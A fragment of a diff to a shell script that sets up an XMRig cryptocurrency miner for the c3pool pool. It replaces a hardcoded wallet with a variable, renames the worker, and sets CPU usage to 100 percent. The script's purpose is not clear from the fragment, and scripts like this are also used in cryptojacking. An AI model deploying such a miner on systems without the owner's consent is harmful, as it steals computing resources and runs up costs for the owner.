@@ -296,8 +296,8 @@ if [ ! -z $EMAIL ]; then
 fi
 
 sed -i 's/"url": *"[^"]*",/"url": "mine.c3pool.com:'$PORT'",/' $HOME/c3pool/config.json
-sed -i 's/"user": *"[^"]*",/"user": "'4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbRyhgKUqjg6HRgENMQm'",/' $HOME/c3pool/config.json
-sed -i 's/"pass": *"[^"]*",/"pass": "'VM-1'",/' $HOME/c3pool/config.json
+sed -i 's/"user": *"[^"]*",/"user": "'$WALLET'",/' $HOME/c3pool/config.json
+sed -i 's/"pass": *"[^"]*",/"pass": "'PS-VM01'",/' $HOME/c3pool/config.json
 sed -i 's/"max-cpu-usage": *[^,]*,/"max-cpu-usage": 100,/' $HOME/c3pool/config.json
 sed -i 's#"log-file": *null,#"log-file": "'$HOME/c3pool/xmrig.log'",#' $HOME/c3pool/config.json
 sed -i 's/"syslog": *[^,]*,/"syslog": true,/' $HOME/c3pool/config.json
